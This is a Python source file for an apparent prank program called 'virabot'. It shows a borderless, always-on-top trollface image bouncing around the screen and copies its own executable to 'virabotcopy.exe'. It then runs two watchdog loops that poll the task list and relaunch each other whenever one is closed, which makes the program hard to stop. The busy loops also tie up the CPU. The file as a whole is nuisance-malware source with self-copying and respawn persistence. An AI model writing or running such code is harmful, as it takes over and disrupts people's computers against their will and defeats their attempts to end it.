import threading
import subprocess
import tkinter as tk
import os
import shutil
from pathlib import Path
import sys


class Bounce(tk.Toplevel):
    def __init__(self, img, root):
        super().__init__()
        self.root = root
        self.img = img
        self.x = 100
        self.y = 100
        self.dx = 5
        self.dy = 5
        self.screen_width = root.winfo_screenwidth()
        self.screen_height = root.winfo_screenheight()
        self.window_width = 100
        self.window_height = 100
        self.geometry(f"{self.window_width}x{self.window_height}+{self.x}+{self.y}")
        self.title('')
        self.attributes('-topmost', True)
        self.overrideredirect(True)
        label = tk.Label(self, image=self.img)
        label.pack()

        self.move()

    def move(self):
        self.x += self.dx
        self.y += self.dy
        if self.x <= 0 or self.x + self.window_width >= self.screen_width:
            self.dx = -self.dx
        if self.y <= 0 or self.y + self.window_height >= self.screen_height:
            self.dy = -self.dy
        self.geometry(f"{self.window_width}x{self.window_height}+{self.x}+{self.y}")
        self.root.after(20, self.move)


def runw():
    root = tk.Tk()
    root.withdraw()
    path = os.path.join(os.path.dirname(__file__), 'trollface.png')
    trollface = tk.PhotoImage(file=path)
    win = Bounce(trollface, root)
    root.mainloop()

def copy():
    file_path = Path("virabotcopy.exe")
    if file_path.exists():
        file_path.unlink()
    current_file = os.path.abspath(sys.argv[0])
    directory = os.path.dirname(current_file)
    base_name = os.path.basename(current_file)
    file_name, file_extension = os.path.splitext(base_name)
    new_file = f"{file_name}copy{file_extension}"
    new_file_path = os.path.join(directory, new_file)
    shutil.copyfile(current_file, new_file_path)
    return new_file_path

if __name__ == '__main__':
    if len(sys.argv) > 1:
        while True:
            output = subprocess.run(['tasklist'], shell=True, capture_output=True).stdout
            c = str(output).find('virabot.exe')
            if c == -1:
                subprocess.Popen('virabot.exe')
    else:
        copy = copy()
        t1 = threading.Thread(target=runw)
        t1.start()


        while True:
            output = subprocess.run(['tasklist'], shell=True, capture_output=True).stdout
            c = str(output).find('virabotcopy.exe')
            if c == -1:
                subprocess.Popen([copy, 'virabotcopy'])
